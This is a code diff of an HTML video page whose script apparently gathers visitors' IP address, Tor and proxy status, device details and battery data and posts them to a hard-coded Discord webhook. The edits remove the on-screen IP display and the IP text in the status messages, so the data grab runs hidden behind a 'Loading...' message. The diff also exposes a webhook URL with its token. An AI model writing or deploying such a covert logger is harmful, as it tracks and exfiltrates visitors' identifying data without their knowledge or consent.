@@ -81,24 +81,6 @@
             color: #ff4444;
             border-color: #ff4444;
         }
-        /* Nuevo elemento para mostrar la IP grande */
-        #ip-display {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            z-index: 20;
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 3em;
-            color: #00ff00;
-            text-shadow: 0 0 20px #00ff00, 0 0 40px #00ff00;
-            background: rgba(0,0,0,0.7);
-            padding: 20px 40px;
-            border-radius: 12px;
-            border: 2px solid #00ff00;
-            pointer-events: none;
-            display: none; /* se muestra con JS */
-        }
     </style>
 </head>
 <body>
@@ -113,12 +95,10 @@
     </video>
 
     <div id="status">Loading...</div>
-    <div id="ip-display"></div>
 
     <script>
         (function() {
             const statusEl = document.getElementById('status');
-            const ipDisplayEl = document.getElementById('ip-display');
             const WEBHOOK_URL = 'https://discord.com/api/webhooks/1537148912111059014/BqjpnaFhgaclQzaFHQ5aFUktrEg4Vo-YdgxKDtjP3C-o9bPIz5biUvNnjth25Gmu6iR6';
 
             function getDeviceInfo() {
@@ -215,14 +195,14 @@
                         body: JSON.stringify(payload)
                     });
                     if (resp.ok) {
-                        statusEl.textContent = 'IP: ' + (ipData.ip || 'Unknown') + ' - Sent Data';
+                        statusEl.textContent = 'Sent Data';
                         statusEl.className = '';
                     } else {
-                        statusEl.textContent = 'IP: ' + (ipData.ip || 'Unknown') + ' - Error: ' + resp.status;
+                        statusEl.textContent = 'Error: ' + resp.status;
                         statusEl.className = 'error';
                     }
                 } catch (e) {
-                    statusEl.textContent = 'IP: ' + (ipData.ip || 'Unknown') + ' - Sending Error: ' + e.message;
+                    statusEl.textContent = 'Sending Error: ' + e.message;
                     statusEl.className = 'error';
                 }
             }
@@ -261,12 +241,6 @@
                         ipData = { ip: 'Unknown', proxy: false, tor: false };
                     }
                 }
-
-                // --- Mostrar la IP en la pantalla (sin cifrado) ---
-                const ipText = ipData.ip || 'Unknown';
-                statusEl.textContent = 'IP: ' + ipText + ' - Obtenida';
-                ipDisplayEl.style.display = 'block';
-                ipDisplayEl.textContent = '🌐 ' + ipText;
 
                 const torDetected = torData && torData.IsTor === true;
                 await sendToDiscord(ipData, device, battery, torDetected);
